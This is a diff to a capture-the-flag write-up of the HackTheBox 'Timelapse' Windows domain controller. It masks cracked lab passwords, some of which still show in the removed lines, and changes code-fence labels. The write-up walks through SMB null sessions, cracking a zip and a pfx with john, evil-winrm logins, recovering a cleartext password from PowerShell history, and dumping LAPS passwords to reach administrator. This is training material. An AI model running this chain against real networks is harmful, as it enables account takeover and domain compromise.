@@ -59,7 +59,7 @@ From the nmap result we can say that it's a domain controller. Let's start our e
 ```bash
 smbclient -N -L  \\\\10.10.11.152
 ```
-Looking into the result, `Shares` share looks interesting. Let's connect will null authentication.
+Looking into the result, `Shares` share looks interesting. Let's connect with NULL session authentication.
 
 ```bash
 smbclient -N  \\\\10.10.11.152\\Shares
@@ -73,7 +73,7 @@ smb: \> ls
 
 There are two directories inside `Shares`. Let's look into `Dev`. There is a `winrm_backup.zip` file. Let's download the file locally.
 
-```bash
+```powershell
 smb: \dev\> ls
   .                                   D        0  Mon Oct 25 15:40:06 2021
   ..                                  D        0  Mon Oct 25 15:40:06 2021
@@ -93,7 +93,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+!!zip_password!!    (winrm_backup.zip/legacyy_dev_auth.pfx)
 ```
 ## Initial foothold
 
@@ -108,7 +108,7 @@ john -w=/usr/share/wordlists/rockyou.txt pfx.hashjohn pfx.hash
 ```bash
 john pfx.hash --show                                                                
 
-legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx
+legacyy_dev_auth.pfx:!!pfx_password!!:::::legacyy_dev_auth.pfx
 ```
 Now let's generate the private key and the certificate.
 ```bash
@@ -121,7 +121,7 @@ Enter Import Password:
 ```
 
 Now try to connect to the box using `evil-winrm`.
-```bash
+```powershell
 evil-winrm -i 10.10.11.152 -S -k priv-key.pem -c certificate.pem                      
 
 Evil-WinRM shell v3.3
@@ -136,7 +136,7 @@ timelapse\legacyy
 We got shell into the box as `legacyy`, and we can grab the user flag from the `Desktop` folder of `legacyy`.
 
 ## User enumeration
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\legacyy\Documents> net user
 
 User accounts for \\
@@ -149,7 +149,7 @@ TRX
 The command completed with one or more errors.
 ```
 `svc_deploy` looks interesting. Let's check its privileges.
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
 User name                    svc_deploy
 Full Name                    svc_deploy
@@ -184,13 +184,13 @@ We can see that `svc_deploy` is part of `LAPS_Readers`. If we can get shell as `
 
 `winpeas` found the powershell history. Let's look into it.
 
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 whoami
 ipconfig /all
 netstat -ano |select-string LIST
 $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
-$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$p = ConvertTo-SecureString '!!svc_deploy_password!!' -AsPlainText -Force
 $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
 invoke-command -computername localhost -credential $c -port 5986 -usessl -
 SessionOption $so -scriptblock {whoami}
@@ -199,8 +199,8 @@ exit
 ```
 We can see the clear text password for the account `svc_deploy`. Let's connect to it using `evil-winrm`.
 
-```bash
-evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+```powershell
+evil-winrm -i 10.10.11.152 -S -u svc_deploy -p '!!svc_deploy_password!!'
 
 Evil-WinRM shell v3.3
 
@@ -213,7 +213,7 @@ timelapse\svc_deploy
 ```
 Now we have shell as `svc_deploy`. We will use [Get-LAPSPasswords.ps1](https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1) to dump the `laps` password. Get the script into the box and run it.
 
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\Get-LAPSPasswords.ps1
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords
 
@@ -221,32 +221,14 @@ Now we have shell as `svc_deploy`. We will use [Get-LAPSPasswords.ps1](https://g
 Hostname   : dc01.timelapse.htb
 Stored     : 1
 Readable   : 1
-Password   : z1.6.gh2MO947b}362/StY.6
+Password   : !!laps_password!!
 Expiration : 8/8/2022 5:39:07 AM
 
 Hostname   : dc01.timelapse.htb
 Stored     : 1
 Readable   : 1
-Password   : z1.6.gh2MO947b}362/StY.6
+Password   : !!laps_password!!
 Expiration : 8/8/2022 5:39:07 AM
-
-Hostname   :
-Stored     : 0
-Readable   : 0
-Password   :
-Expiration : NA
-
-Hostname   : dc01.timelapse.htb
-Stored     : 1
-Readable   : 1
-Password   : z1.6.gh2MO947b}362/StY.6
-Expiration : 8/8/2022 5:39:07 AM
-
-Hostname   :
-Stored     : 0
-Readable   : 0
-Password   :
-Expiration : NA
 
 Hostname   :
 Stored     : 0
@@ -257,7 +239,25 @@ Expiration : NA
 Hostname   : dc01.timelapse.htb
 Stored     : 1
 Readable   : 1
-Password   : z1.6.gh2MO947b}362/StY.6
+Password   : !!laps_password!!
+Expiration : 8/8/2022 5:39:07 AM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : !!laps_password!!
 Expiration : 8/8/2022 5:39:07 AM
 
 Hostname   :
@@ -280,8 +280,8 @@ Expiration : NA
 ```
 We got the password. Let's try to connect to the box as `administrator` with the `password` using `evil-winrm`.
 
-```bash
-evil-winrm -i 10.10.11.152 -S -u administrator -p 'z1.6.gh2MO947b}362/StY.6'
+```powershell
+evil-winrm -i 10.10.11.152 -S -u administrator -p '!!laps_password!!'
 
 Evil-WinRM shell v3.3
 
@@ -295,7 +295,7 @@ timelapse\administrator
 ```
 Now we are `administrator`. Get the `root` hash form TRX Desktop.
 
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users> dir TRX\Desktop
 
 
